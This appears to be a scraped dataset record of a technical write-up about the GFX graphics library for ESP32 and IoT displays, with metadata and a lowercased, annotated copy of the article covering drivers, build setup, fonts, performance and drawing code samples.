for color displays and gfx::gsc_pixel<1> for monochrome (1 bit grayscale) displays. It tells GFX what the native format of your draw object is.\npixel_type - indicates the native pixel format for this target\nIf your pixel type is indexed, meaning it contains channel_name::index, you must include using palette_type alias for your palette type. For drivers like e-paper displays, they will usually have an associated palette class that this aliases.\npalette_type - indicates the associated palette type if pixel_type refers to an indexed pixel.\nNow you can start implementing methods you'll need. Most of the methods return the enum gfx::gfx_result indicating the status of the operation.\nFirst, aside from the caps and pixel_type aliases, there are methods you must implement regardless:\nsize16 dimensions() const - returns a size16 that indicates the dimensions of the draw target.\nrect16 bounds() const - returns a rect16 with a top left corner of (0,0) and a width and height equal to that of the draw target. This is an alias for dimensions().bounds().\nNext, if your pixel_type refers to an indexed pixel you must implement a palette() method which returns a pointer to a palette associated with your draw target.\nconst palette_type* palette() const - returns a pointer to the palette associated with this draw target\nDraw Source Members\nTo implement a target as a draw source, you must additionally implement one, or possibly two methods:\ngfx_result point(point16 location, pixel_type* out_color) const - retrieves a pixel at the specified location\ngfx_result copy_to<typename Destination>(const rect16& src_rect,Destination& dst,point16 location) const - copies a portion of the target to the specified destination at the specified location\nIf you implement copy_to<>() be sure to set the corresponding entry in your caps so that GFX will call it.\nEither way, now you can use it as a source to calls like draw::bitmap<>().\nDraw Destination Members\nBecause of the variety of optimizations necessary to achieve good performance on device drivers, it can be significantly more involved to implement a draw destination than a draw source.\nThe least you must implement other than the common methods are the first two methods, but the methods that follow those are optional and allow for better performance. I will not be listing the _async() methods to save space, since their names and signatures are derived from the synchronous methods.\ngfx_result point(point16 location, pixel_type color) - sets a pixel at the specified location\ngfx_result fill(const rect16& rect, pixel_type color) - fills a rectangle at the specified location\nAbove is the minimum. What the rest is depends on the caps settings.\nAn important one for doing high performance copies of bitmap data is copy_from<>():\ntemplate<typename Source> gfx_result copy_from(const rect16& src_rect,const Source& src,point16 location) - copys from a draw source to the draw target.\nThis method should determine what the best action to be taken for sending the src's data to this target as quickly as possible. It should not use the source's copy_to<>() method but aside from that it can use anything. Often what one will do is internally call another template that specializes for when Source::pixel_type is the same as pixel_type, and that the source can be blted. then potentially do a raw memory read. If so, you may be able to initiate a DMA transfer, for example. Then you have to have fallback scenarios if that isn't supported.\nNext we'll cover batching. If you support batching operations, you'll need to implement the following three methods:\ngfx_result begin_batch(const rect16& rect) - begins a batch operation at the specified rectangle.\ngfx_result write_batch(pixel_type color) - writes a pixel to the current batch. Pixels are written to the batch rectangle in order from left to right, top to bottom. If your pixel buffer gets full, it's acceptable to send as needed. Batch isn't suspend, it's just a way to cut down traffic.\ngfx_result commit_batch() - writes any remaining batched data out and reverts from batching mode.\nWhen you implement batching, make sure that you automatically commit the current batch if the caller begins a non-batch operation while in the middle of a batch, or if they begin a new batch operation.\nIf you support suspend/resume (double buffering) you'll need to implement the following two methods:\ngfx_result suspend() - suspends drawing. Suspends are counted and balanced, so for every suspend call, you must make a corresponding resume() call.\ngfx_result resume(bool force=false) - resumes drawing, optionally discarding all previous suspends() and forcibly resuming the draw. The screen is updated when the final resume is called.\nFinally, every one of the writing methods potentially has an _async() counterpart that take the same parameters but queue the operation and return as soon as possible. There is currently no provision for doing async reads but that will change in the future.\nWhere to Go From Here\nThe demo projects that ship with this should provide you ample code to learn GFX or even build your own drivers. Currently, I'm focused on supporting the ESP32 via the ESP-IDF, but GFX itself is not limited by platform, and drivers can be written for anything - even DirectX on a Windows PC.\nHistory\n10th May, 2021 - Initial submission\n16th May, 2021 - Added drivers, configurations, wiring guide\n17th May, 2021 - Added more drivers\n18th May, 2021 - Added sprite/transparent color support to draw::bitmap<>()\n21st May, 2021 - Bugfix and added another driver\n21st May, 2021 - draw::bitmap<>() bugfix\n24th May, 2021 - Fixed build errors on some demos\n27th May, 2021 - Added alpha blending support\n29th May, 2021 - Added large_bitmap<> support, API changes, demo changes\n31st May, 2021 - API cleanup and added paths and polygon support\n31st May, 2021 - Fixed several build errors\n1st June, 2021 - Added/fixed bitmap resize options and added dimensions to image callback\n5th June, 2021 - Added single header file, and easier to use image loading. cleaned up positioning api a bit. bugfix in declarions of clipping rect parameters on draw::\n7th June, 2021 - Service release. Certain draw operations between certain draw targets would fail to compile\n8th June, 2021 - Added palette/CLUT support (initial/experimental)\n8th June, 2021 - Service release. Fixed large_bitmap<> out of bounds crashing issue\n13th June, 2021 - Added Arduino framework support and several Arduino based drivers\n15th June, 2021 - Added support for two e-ink/e-paper displays: the DEP0290B (and the associated LilyGo T5 2.2 board) as well as the GDEH0154Z90 (WaveShare 1.54 inch 3-color black/white/red display).\n17th June, 2021 - Added dithering support for e-ink/e-paper displays\n13th July, 2021 - Added TrueType font support\n30th July, 2021 - Service release - fixed a stream.hpp bug and updated platformio.ini to build for the newer ESP-IDF\n13th November, 2021 - One bugfix, and the addition of an RA8875 driver and the viewport<> template\n15th November, 2021 - Performance and feature improvements to the RA8875 driver and improvements to the viewport<> template\n8th December, 2021 - Restructure of the library, bugfixes and the addition of TFT_eSPI bindings", "link": "https://github.com/codewitch-honey-crisis/gfx_demo", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "introduction\ni wanted a graphics library that was faster and better than what i had found for various iot devices. the most popular is probably adafruit_gfx, but it's not optimal. it's very minimalistic, not very optimized, and doesn't have a fully decoupled driver interface. also, being tied to the arduino framework, it can't take advantage of platform specific features that increase performance, like being able to switch between interrupt and polling based spi transactions on the esp32.\ngfx on the other hand, isn't tied to anything. it can draw anywhere, on any platform. it's basically standard c++, and things like line drawing and font drawing algorithms. without a driver, it can only draw to in memory bitmaps, but once you add a driver to the mix, you can draw directly onto displays the same way you do to bitmaps.\nupdate: some minor bugfixes, spi drivers are refactored to use a common base, more drivers are now added, and one click configuration for generic esp32 boards is now available\nupdate 2: included support for the lilygo ttgo board, as well as the green tab 128x128 1.44\" st7735 display (though other green tab models may work too they have not been tested)\nupdate 3: added transparent_color argument to draw::bitmap<>() so you can do sprites.\nupdate 4: gfx draw::rectangle<>() bugfix and added experimental max7219 driver\nupdate 5: bug fixes with bitmap drawing\nupdate 6: fixed some of the demos that were failing the build\nupdate 7: added alpha blending support!\nupdate 8: some api changes, added large_bitmap<> support and edged a little closer to adaptive indexed color support. i also used the large bitmap for the frame buffer in the demos, and changed that code to be easier to understand at the cost of raw pixel throughput.\nupdate 9: added polygon and path support, and cleaned up the api here and there a bit\nupdate 10: fixed several build errors with the last update. mea culpa.\nupdate 11: added bilinear and bicubic resampling for draw::bitmap<>() resizing options, and fixed the nearest neighbor drawing. also improved the performance of the drawing during resize (though bicubic could stand to be optimized to use ints instead of floats). added image dimensions to jpeg_image::load()'s callback.\nupdate 12: easy of use update. i've compiled all of the includes into a single includable header, and i've added draw::image<>() which deals with the progressive loading so you don't need to do it yourself.\nupdate 13: service release. certain draw operations between certain draw targets would fail to compile\nupdate 14: added palette/clut support! (still a baby, not quite complete but i'll mature it as i go)\nupdate 15: service release. fixed large_bitmap<> out of bounds crashing issue\nupdate 16: added arduino framework support and several drivers. i have not tested the arduino framework support with anything other than an esp32, but it will not necessarily compile on all arduinos.\nupdate 17: added support for two e-ink/e-paper displays: the dep0290b (and the associated lilygo t5 2.2 board) as well as the gdeh0154z90 (waveshare 1.54 inch 3-color black/white/red display). the former only works on the arduino framework for now, until i hunt down the issue under the esp-idf that prevents it from working.\nupdate 18: added dithering support for e-paper displays\nupdate 19: added truetype font support!\nupdate 20: service release - fixed a stream.hpp bug and updated platformio.ini to build for the newer esp-idf\nupdate 21: a bugfix, and the addition of the viewport<> template class that allows for rotation and offsetting of drawing operations.\nupdate 22: added performance improvement to viewport<> and changed api slightly. updated the ra8875 driver with performance improvements, hardware scrolling, and touch support.\nupdate 23: restructure of source files, plus some fixes with compile time errors with certain combinations of draw targets and draw operations. this is no longer a header only library because i needed to expand its targeting past iot devices, and be used in more build situations/environments. the header only library only worked without conflicts under certain build environments. furthermore i've added tft_espi bindings/drivers for superior performance and additional device support.\nupdate 24: added windows directx support for rapid prototyping. fixed compile errors under certain environmen\nbuilding this mess\nyou'll need visual studio code with the platform io extension installed. you'll need an esp32 with a connected ili9341 lcd display an ssd1306 display, or other display depending on the demo.\ni recommend the espressif esp-wrover-kit development board which has an integrated ili9341 display and several other pre-wired peripherals, plus an integrated debugger and a superior usb to serial bridge with faster upload speeds. they can be harder to find than a standard esp32 devboard, but i found them at jameco and mouser for about $40 usd. they're well worth the investment if you do esp32 development. the integrated debugger, though very slow compared to a pc, is faster than you can get with an external jtag probe attached to a standard wrover devboard.\nmost of you however, will be using one or more of the generic esp32 configurations. first decide which framework you want to use - esp-idf, or arduino. at the bottom of the screen in the blue bar of vs code, there is a configuration switcher. it should be set at default to start, but you can change it by clicking on default. a list of many configurations will drop down from the top of the screen. from there, you can choose which generic esp32 setup you have, based on the display attached to it, and with it, which framework you want to use.\nin order to wire all this up, refer to wiring_guide.txt which has display wirings for spi and i2c displays. keep in mind some display vendors name their pins with non-standard names. for example, on some displays mosi might be labled as din or a0. you make have to do some googling to find out the particulars for your device.\nbefore you can run it, you must upload filesystem image under the platform io sidebar - tasks.\nnote: the platform io ide is kind of cantankerous sometimes. the first time you open the project, you'll probably need to go to the platform io icon on the left side - it looks like an alien. click it to open up the sidebar and look under quick access|miscellaneous for platform io core cli. click it, and then when you get a prompt type pio run to force it to download necessary components and build. you shouldn't need to do this again, unless you start getting errors again while trying to build. also, for some reason, whenever you switch a configuration you have to go and refresh (the little circle-arrow next to \"project tasks\") before it will take.\nthe demos are not all the same despite gfx capabilities being pretty much the same for each display. the reason is that there are no asynchronous operations for i2c devices, and because some of the displays simply aren't big enough to show the jpgs or they are monochrome like the ssd1306, so the jpg would look a mess.\nthe following configurations are currently supported. select the one that you want to use before building:\nesp-idf-esp-wrover-kit\nesp-idf-lilygo-ttgo\nesp-idf-st7735\nesp-idf-ili9341\nesp-idf-st7789\nesp-idf-ssd1306\nesp-idf-ssd1351\nesp-idf-max7219*\nesp-idf-gdeh0154z90\narduino-esp-wrover-kit\narduino-lilygo-ttgo\narduino-lilygo-t5_v22\narduino-ili9341\narduino-depg0290b\narduino-gdeh0154z90\narduino-st7789\narduino-ssd1306\narduino-ssd1351\narduino-st7735\narduino-ra8875\narduino-tft_espi\nwindows-directx\nthe max7219 cs pin is 15, not 5. driver is experimental and multiple rows of segments does not work, but multiple segments in a single row works.\nbuilding with tft_espi\ntft_espi by bodmer is probably the fastest tft driver for the arduino framework. it really is a great offering, but it works a lot differently that gfx, and has different features. with the gfx_tft_espi driver you can use gfx with tft_espi and enjoy higher framerates and even more supported displays, while taking advantage of gfx features like true type and flexible pixel formats.\ni do not provide bodmer's library with this distribution, for several reasons, and i don't recommend using it via lib_deps / fetching it using platform io's automated installer. download it from bodmer's github repository here and put it under the libs folder in the gfx_demo project. switch to the arduino-tft_espi configuration. as long as this library is in that folder the other projects won't build. unfortunately i haven't found a way to work around this with platformio without modifying tft_espi itself which is a non-starter.\nhere's the process:\ndownload the library and unzip it.\nput it under /lib (the tft_espi-master folder should be alongside the gfx folder)\nswitch your configuration to arduino-tft_espi\nconfigure the tft_espi library by setting your display and pins in user_setup.h under his library's folder.\nbuilding with windows and directx\nfirst go to platformio/quick access/miscellaneous/platformio core cli, open a new console and type:\nbat\npio platform install \"windows_x86\"\ngo to your project, and open /src/windows/directx_demo.hpp. once there, change #define font_path \"maziro.ttf\" so that the path matches the full path to that font file, which will be under the /fonts folder.\nnext, this is a little tricky, due to an inconsistency between microsoft's c++ compiler, and gcc. you must patch a system header, or your programs will crash. the patch won't hurt other programs, in fact, the other programs will still crash on the patched header if compiled with gcc. this is because you have to define widl_explicit_aggregate_returns in order for the patched code to take effect.\nnow you need to build the windows configuration to ensure platformio has all of the files it needs.\nnext you need to locate platformio's copy of the system header d2d1.h. you can do so by opening windows/drivers/dxd2d.hpp and finding #include <d2d1.h> and then right clicking on the filename and selecting \"go to definition.\" one there, right click on it's tab to copy the full path.\nnext use the windows search bar to search for notepad, right click on the result, and click \"run as administrator.\"\nonce it's open, go to open a file, and paste the path into the dialog box, and hit enter.\ngo to vs code, and copy the contents of d2d1_patched_minigw.h and paste them into your notepad instance. finally, save.\nnow go to platformio and clean your project. this must be done.\nnow you can build a working application. keep in mind windows works dramatically different in terms of flow than an iot application. you must render each frame on the wm_paint event, so the structure of the demo is far different than the others, employing a state machine to make a coroutine out of the lines demo.\nin order to run the application, open a console again. then you need to type the following command:\nbat\n.pio\\build\\windows-directx\\program.exe\nthe driver is not very fast, due to the \"polarity mismatch\" between directx and gfx. directx works far differently than gfx and bridging the gap is not efficient. this driver is meant for prototyping screens, and for that it is effective, since it shortens build times and eliminates upload times.\ne-paper display support\nblack and white e-paper display drivers can virtualize an expanded bit depth to emulate grayscales through dithering. the final template parameter of the driver indicates the bit depth and defaults to 1, which disables dithering.\ncolor e-paper displays dither or they will match the nearest color among their palette. if you need better dithering performance, you can predither your jpegs in a paint program targeting the e-paper display's palette and then disable virtualization. the final template parameter indicates the pixel type of the color pixel you wish to virtualize.\nkeep in mind the higher the virtualized bit depth, the more memory the driver will use.\nconcepts\nbelow is a high level summary. for more detailed information, i've been producing a series which begins at the link.\ndraw sources and destinations\ngfx introduces the idea of draw sources and destinations. these are vaguely or loosely defined types that expose a set of members that allow gfx to bind to them to perform drawing operations. the set of members they expose varies based on their capabilities, and gfx adapts to call them in the most efficient manner that the target supports for the given operation. the drawing functions in gfx take destinations, and some operations such as copying bitmapped pixel data or otherwise reading pixel information take sources.\nthe code size is related to how many different types of sources and destinations you have, and what kind of drawing or copying you're doing between them. the more diverse your sources and destinations, the larger the code.\ndraw sources and destinations include in memory bitmaps and display drivers, but you can potentially craft your own. we'll be getting into how later.\nbitmaps\nbitmaps are sort of all-purpose draw source/destinations. they basically allow you to hold drawn data around in memory, which you can then draw somewhere else. bitmaps do not hold their own memory. this is because not all memory is created equal. on some platforms for example, in order to enable a bitmap to be sent to the driver, the bitmap data must be stored in dma capable ram. the other reason is so you can recycle buffers. when you're done with a bitmap you can reuse the memory for another bitmap (as long as it's big enough) without deallocating or reallocating. the disadvantage is a small amount of increased code complexity wherein you must determine the size you need for the bitmap, and then allocate the memory for it yourself, and possibly freeing it yourself later.\ndrivers\ndrivers are a typically a more limited draw target, but may have performance features, which gfx will use when available. you can check what features draw sources and destinations have available using the caps member so that you can call the right methods for the job and for your device. you don't need to worry about that if you use the draw class which does all the work for you. drivers may have certain limitations in terms of the size of bitmap they can take in one operation, or performance characteristics that vary from device to device. as much as possible, i've tried to make using them consistent across disparate sources/destinations, but some devices, like e-paper displays are so different that care must be taken when using them in order to employ them in the way that is most effective.\ncustom\nyou can implement your own draw sources and destinations by simply writing a class with the appropriate members. we'll cover that toward the end.\npixel types\npixels in gfx may take any form you can imagine, up to your machine's maximum word size. they can have as many as one channel per bit, and will take on any binary footprint you specify. if you want a 3 bit rgb pixel, you can easily make one, and then create bitmaps in that format - where there are 3 pixels every 9 bytes. you'll never have to worry whether or not this library can support your display driver or file format's pixel and color model. with gfx, you can define the binary footprint and channels of your pixels, and then extend gfx to support additional color models other than the 4 it supports simply by telling it how to convert to and from rgb*.\n*indexed pixel formats are accounted for, but there are certain restrictions in place and care must be taken when using them because they need an associated palette in order to resolve to a color.\nwhen you declare a pixel format, it becomes part of the type signature for anything that uses it. for example, a bitmap that uses a 24-bit pixel format is a different type than one that uses a 16-bit pixel format.\ndue to this, the more pixel formats you have, the greater your code size will be.\nalpha blending\nif you create pixels with an alpha channel, it will be respected on supported destinations. not all devices support the necessary features to enable this. it's also a performance killer, with no way to make it faster without hardware support, which isn't currently available for any supported device. typically, it's best to alpha blend on a bitmap, and then draw the bitmap to a driver due to performance issues and the fact that many drivers currently do not act as draw sources, and so cannot alpha blend.\nindexed color/palette support\nsome draw destinations use an indexed color scheme, wherein they might have 16 active colors for example picked from a palette of 262,144 possible colors. or they may have a fixed set of 8 active colors and that's all. the active colors are all that can be displayed at any given point. this was common on older systems with limited frame buffer sizes. it may also be the case with some iot display hardware, especially color e-paper displays. e-paper displays range from 2 color (monochrome) to 7 color that i've seen.\ndraw targets that use an indexed pixel for their pixel_type - that is, devices with pixels that have a channel with a channel_name of index, are expected to expose a palette_type type alias that indicates the type of the palette they are using, as well as a palette_type* palette() const method that returns a pointer to the current palette.\nwhen you draw to a target that has indexed pixels, a best effort attempt is made to match the requested color with one of the active colors in the palette. it will match the closest color it finds. this isn't free. it's pretty cpu intensive so buyer beware, especially when loading jpegs or something into an indexed target. it will have to run a nearest match on every single pixel, scanning through the palette once for every pixel!\nyou have to be careful with indexed colors. they can't be used in isolation, because without a palette you don't have enough information to get a color from it. draw targets can have palettes, so the combination of an indexed pixel and a matching draw target yields a valid color. because of this you can't use the color<> template with indexed colors, for example, because without a palette there's no way to know what index value best corresponds to, for example old_lace, or even white. you'll hopefully get compile errors when you try to use indexed pixels in places where they can't be used, but worse case, you get errors at run time when trying to draw. when trying to draw, this is usually not something you have to worry about much.\nif you must translate indexed pixels to other kinds of pixels yourself can use convert_palette_from<>(), convert_palette_to<>() and convert_palette<>(). these will convert to and from indexed colors optionally alpha blending in the process. they take draw targets in order to get access to the palette information.\ndrawing elements\ndrawing elements are simply things that can be drawn, like lines and circles.\nprimitives\ndrawing primitives include lines, points, rectangles, arcs, ellipses and polygons each except the first two in filled and unfilled varieties. most take bounding rectangles to define their extents, and for some such as arcs and lines, orientation of the rectangle will alter where or how the element is drawn.\ndraw sources\ndraw sources again, are things like bitmaps, or display drivers that support read operations. these can be drawn to draw destinations, again like other bitmaps or display drivers that support write operations. the more different types of source and destination combinations that are used in draw operations, the larger the code size. when drawing these, the orientation of the destination rectangle indicates whether to flip the drawing along the horizontal or vertical axes. the draws can also be resized, cropped, or pixel formats converted.\nfonts\ngfx supports two types of fonts. it supports a fast raster font and true type or open type fonts, depending on your needs. if you need quick and dirty, with the emphasis on quick, use the font class. for pretty, scalable and potentially anti-aliased fonts at the expense of performance, use the open_font class.\nthe behavior and design of each are slightly different due to different capabilities and different performance considerations. for example, raster fonts are always allocated in either ram or progmem space. this is because they are small and so that they will operate at maximum speed. truetype fonts on the other hand, are larger, much more complicated fonts, and so gfx will stream them directly from a file as needed, trading speed for minimal ram use. unlike raster fonts, true type fonts are essentially not loaded into memory, and will only cause temporary memory allocations as needed to render text.\nboth font and open_font can be loaded from a readable, seekable stream such as a file_stream. this if anything, will make font slightly quicker and open_font much slower than when you embed them. the raster fonts are old windows 3.1 fon files while the true type font files are platform agnostic ttf and otf files.\nalternatively, you can use the fontgen to create a c++ header file from a font file. this header can then be included in order to embed the font data directly into your binary. this is a static resource rather than loaded into the heap. this is the recommended way of loading fonts when you can, especially with open_font.\nwhen fonts are drawn, very basic terminal control characters like tab, carriage return, and newline are supported. raster fonts can be drawn with or without a background, though it's almost always much faster to draw them with one, at least when drawing to a display.\ntrue type layout considerations\ntrue type fonts must usually be downscaled from their native size before being displayed. you can use the scale() method passing the desired font height in pixels.\nnote that sizes and positions with true type are somewhat approximate in that they don't always reflect what you think they might. part of that is nature of digital typesetting and part of that is because non-commercial font files often have bad font metrics in them. it usually takes some trial and error to get them pixel perfect.\nalso note that unlike raster fonts, true type font glyphs aren't limited to a bounding box. they can overhang part of the letter outside of the specified draw area which can lead to the left and top edges of letters in your destination area being clipped. fortunately, you can draw text with an offset parameter to offset the text within the drawing area to avoid this, and/or to adjust the precise position of the text.\nin addition to loading and providing basic information about fonts, the font and open_font classes also allow you to measure how much space a particular region of text will require in that font.\nimages\nimages include things like jpegs, which is currently the only format this library supports, although png will be included soon-ish.\nimages are not drawing elements because it's not practical to either load an image into memory all at once, nor get random access to the pixel data therein, due to compression or things like progressively stored data.\nin order to work with images, you can use the draw class which will draw all or part of the image to a destination, or you can handle a callback that reports a portion of an image at a time, along with a location that indicates where the portion is within the image. for example, for jpegs a small bitmap (usually 8x8 or so) is returned for each 8x8 region from left to right, top to bottom. each time you receive a portion, you can draw it to the display or some other target, or you can postprocess it or whatever.\ncurrently unlike with fonts, there is no -----> tool !!!  to create headers that embed images directly into your binary. this will probably be added in a future version.\nperformance\nfor the most part, gfx makes a best effort attempt to reduce the number of times it has to call the driver (with the exception of batch writes), even if that means working the cpu a little harder. for example, instead of drawing a diagonal line as a series of points, gfx draws a line as series of horizontal or vertical line segments. instead of rending a font dot by dot, gfx will batch if possible, or otherwise use run lengths to draw fonts as a series of horizontal lines instead of individual points. trading cpu for reduced bus traffic is a win because usually you have a lot more of the former than the latter to spare, not that you have much of either one. gfx is relatively efficient, eschewing things like virtual function calls, but most of the gain is through being less chatty at the bus level.\nthat said, there are ways to significantly increase performance by using features of gfx which are designed for exactly that.\nbatching\none way to increase performance by reducing bus traffic is by batching. normally, in order to do a drawing operation, a device must typically set the target rectangle for the draw beforehand, including when setting a single pixel. on an ili9341 display, this resolves to 6 spi transactions in order to write a pixel, due to dc line control being required which splits each command into two transactions.\none way to cut down on that overhead dramatically is to set this address window, and then fill it by writing out pixels left to right, top to bottom without specifying any coordinates. this is known as batching and it can cut bus traffic and increase performance by orders of magnitude. gfx will use it for you when it can, and if it's an available feature on the draw destination.\nthe primary disadvantage to this is simply the limited opportunities to use it. it's great for things like drawing filled rects, or drawing bitmaps when blting and dma transfers are unavailable, but you have to be willing to fill an entire rectangle with pixels in order to use it. if you're drawing a font with a transparent background or a 45 degree diagonal line for example, gfx effectively won't be able to batch. batching can occur whenever there is an entire rectangle of pixels which must be drawn, and a direct transfer of bitmap data isn't possible, either because the source or target doesn't support it, or because some sort of operation like bit depth conversion or resizing needs to happen. batching makes for a great way to speed up these types of operations. you can't use it directly unless you talk right at the driver, because at the driver level, using it incorrectly can create problems in terms of what is being displayed. gfx will use it wherever possible when you use draw.\ndouble buffering with suspend/resume\nsome devices will support double buffering. this can reduce bus traffic when the buffer is in local ram such as it is with the ssd1306 driver, but even if it's stored on the display device using suspend and resume can make your drawing not flicker so much. what happens is once suspended, any drawing operations are stored instead of sent to the device. once resumed, the drawn contents get updated all at once. in some situations, this can generate more bus traffic than otherwise, because resuming typically has to send a rectangle bounding the entire modified section to the device. therefore, this is more meant for smooth drawing than raw throughput. gfx will use it automatically when drawing, but you can use it yourself to extend the scope of the buffered draw, since gfx wouldn't know for example, that you intended to draw 10 lines before updating the display. it will however, buffer on a line by line basis even if you don't, again if the target supports it.\nasynchronous operations\nasynchronous operations, when used appropriately, are a powerful way to increase the throughput of your graphics intensive application. the main downside of using it, is typically asynchronous operations incur processing overhead compared to their synchronous counterparts, coupled with the fact that you have to use it very carefully, and when transferring lots of data in order to get a benefit out of it, which means lots of ram use.\nhowever, when you need to transfer a lot of a data at a time, using asynchronous operations can be a huge win, allowing you to fire off a big transfer in the background, and then almost immediately begin drawing your next frame, well before the transfer completes.\ntypically in order to facilitate this, you'll create two largeish bitmaps (say, 320x16) and then what you do is you draw to one while sending the other asynchronously, and then once the send is done, you flip them so now you're drawing on the latter one while sending the first one that you just drew.\ndrawing bitmaps asynchronously is really the only time you're going to see throughput improvements. the reason there are other asynchronous api calls as well is usually in order to switch from asynchronous to synchronous operations all the pending asynchronous operations in the target's queue have to complete, so basically after you queue your bitmap to draw, you can continue to queue asynchronous line draws and such in order to avoid having to wait for the pending operations to complete. however, when you're using the flipping bitmaps method above to do your asynchronous processing, these other asynchronous methods won't be necessary, since drawing to bitmaps is always synchronous, and has nothing to do with bus traffic or queuing asynchronous bus transactions. drawing synchronously to bitmaps does not affect the asynchronous queue of the draw target. each asynchronous queue is specific to the draw source or destination in question.\nperformance differences by framework\nesp-idf\nthe esp-idf is capable of doing asynchronous dma transfers over spi, but right now the overall spi throughput is less than the arduino framework. i'm investigating why this is. i have related issues that are preventing me from supporting certain devices under the esp-idf, like the ra8875.\narduino framework\nthe arduino framework's spi interop is tightly timed and fast, but doesn't support asynchronous dma transfers - at least not explicitly - and doesn't seem to have a facility for returning errors during spi read and write operations. therefore i think it's less likely for wiring problems to be reported with the arduino versions of the drivers, but i'm not exactly sure since i haven't tried to create such a scenario to test with. the arduino framework is more likely to support a device than the esp-idf due to differences in the spi communication api characteristics and behavior. xxxx_async methods will always be performed synchronously with the arduino framework.\nusing the gfx api\ninclude gfx.hpp (c++17) or gfx_cpp14.hpp (c++14) to access gfx. including both will choose whichever is first, so don't include both. pick which one you need depending on the c++ standard you are targeting.\nfor the esp-idf toolchain under platform io i've only been able to get it to target up to c++14. the gcc compiler they use under windows isn't new enough to support the newer standard. the c++17 version is slightly more efficient in terms of how the predefined colors function, and might actually be more efficient due to more constexpr resolution. still, there's not any difference in actually using them.\nuse namespace gfx to access gfx.\nheaders\nit is not necessary to explicitly include any of these, though if you're writing driver code you can include a subset to reduce compile times a little.\ngfx_core.hpp - access to basic common types like gfx_result.\ngfx_pixel.hpp - access to the pixel<> type template.\ngfx_positioning.hpp - access to point, size, rect and path types and templates.\ngfx_bitmap.hpp - access to the bitmap<> type template.\ngfx_drawing.hpp - access to draw, the main facilities of gfx.\ngfx_color.hpp - access to the predefined colors through the color<> template, for c++17 or better compilers.\ngfx_color_cpp14.hpp - access to the predefined colors through the color<> template, for c++14 compilers.\ngfx_image.hpp - access to jpeg_image used for loading jpeg images.\ngfx_palette.hpp - access palette support type.\ngfx was designed using generic programming, which isn't common for code that targets little mcus, but here it provides a number of benefits without many downsides, due to the way it's orchestrated.\nfor starters, nothing is binary coupled. you don't inherit from anything. if you tell gfx you support a method, all you need to do is implement that method. if you do not, a compile error will occur when gfx tries to use it.\nthe advantage of this is that methods can be inlined, templatized, and otherwise massaged in a way that simply cannot be done with a binary interface. they also don't require indirection in order to call them. the disadvantage is if that method never gets used, the compiler will never check the code in it beyond parsing it, but the only way that happens is if you implement methods that you then do not tell gfx you implemented, like asynchronous operations.\nin a typical use of gfx, you will begin by declaring your types. since everything is a template basically, you need to instantiate concrete types out of them before you can start to use them. the using keyword is great for this and i recommend it over typedef since it's templatizable and at least in my opinion, it's more readable.\nyou'll often need one for the driver, one for any type of bitmap you wish to declare (you'll need different types for bitmaps with different color models or bit depths, like rgb versus monochrome). once you do that, you'll want one for the color template, for each pixel type. at the very least, you'll want one that matches the pixel_type of your display device, such as using using lcd_color = gfx::color<typename lcd_type::pixel_type>; which will let you refer to things like lcd_color::antique_white.\nonce you've done that, almost everything else is handled using the gfx:draw class. despite each function on the class declaring one or more template parameters, the corresponding arguments are inferred from the arguments passed to the function itself, so you should never need to use <> explicitly with draw. using draw, you can draw text, bitmaps, lines and simple shapes.\nbeyond that, you can also declare fonts, and bitmaps. these use resources while held around, and can be passed as arguments to draw::text<>() and draw::bitmap<>() respectively.\nimages do not use resources directly except for some bookkeeping during loading. they are not loaded into memory and held around, but rather the caller is called back with small bitmaps that contain portions of the image which can then be drawn to any draw destination, like a display or another bitmap. this progressive loading is necessary since realistically, most machines gfx is designed for do not have the ram to load a real world image all at once.\nsome basics\nlet's dive into some code. the following draws a classic effect around the four edges of the screen in four different colors, with \"esp32 gfx demo\" in the center of the screen:\nc++\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::white);\nconst font& f = bm437_ati_9x16_fon;\nconst char* text = \"esp32 gfx demo\";\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),\ntext).bounds();\ndraw::text(lcd,text_rect.center((srect16)lcd.bounds()),text,f,lcd_color::dark_blue);\nfor(int i = 1;i<100;++i) {\n// calculate our extents\nsrect16 r(i*(lcd_type::width/100.0),\ni*(lcd_type::height/100.0),\nlcd_type::width-i*(lcd_type::width/100.0)-1,\nlcd_type::height-i*(lcd_type::height/100.0)-1);\n// draw the four lines\ndraw::line(lcd,srect16(0,r.y1,r.x1,lcd_type::height-1),lcd_color::light_blue);\ndraw::line(lcd,srect16(r.x2,0,lcd_type::width-1,r.y2),lcd_color::hot_pink);\ndraw::line(lcd,srect16(0,r.y2,r.x1,0),lcd_color::pale_green);\ndraw::line(lcd,srect16(lcd_type::width-1,r.y1,r.x2,lcd_type::height-1),lcd_color::yellow);\n// the esp32 wdt will get tickled\n// unless we do this:\nvtaskdelay(1);\n}\nthe first thing is the screen gets filled with white by drawing a white rectangle over the entire screen. note that draw sources and targets report their bounds as unsigned rectangles, but draw typically takes signed rectangles. that's nothing an explicit cast can't solve, and we do that as we need above.\nafter that, we declare a reference to a font we included as a header file. the header file was generated from a old windows 3.1 .fon file using the fontgen tool that ships with gfx. gfx can also load them into memory from a stream like a file rather than embedding them in the binary as a header. each has advantages and disadvantages. the header is less flexible, but allows you to store the font as program memory rather than keeping it on the heap.\nnow we declare a string literal to display, which isn't exciting, followed by something a little more interesting. we're measuring the text we're about to display so that we can center it. keep in mind that measuring text requires an initial ssize16 that indicates the total area the font has to work with, which allows for things like wrapping text that gets too long. essentially measure text takes this size and returns a size that is shrunk down to the minimum required to hold the text at the given font. we then get the bounds() of the returned size to give us a bounding rectangle. note that we call center() on this rectangle when we go to draw::text<>().\nafter that, we draw 396 lines in total, around the edges of the display, such as to create a moire effect around the edges of the screen. each set of lines is anchored to its own corner and drawn in its own color.\ncompare the performance of line drawing with gfx to other libraries. you'll be pleasantly surprised. the further from 45 degrees (or otherwise perfectly diagonal) a line is, the faster it draws - at least on most devices - with horizontal and vertical lines being the fastest.\ndouble buffering, suspend and resume\nlet's try it again - or at least something similar - this time using double buffering on a supporting target, like an ssd1306 display. note that suspend<>() and resume<>() can be called regardless of the draw destination, but they will report gfx::gfx_result::not_supported on targets that are not double buffered. you don't have to care that much about that, because the draws will still work, unbuffered. anyway, here's the code:\nc++\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::black);\nconst font& f = bm437_acer_vga_8x8_fon;\nconst char* text = \"esp32 gfx\";\nsrect16 text_rect = 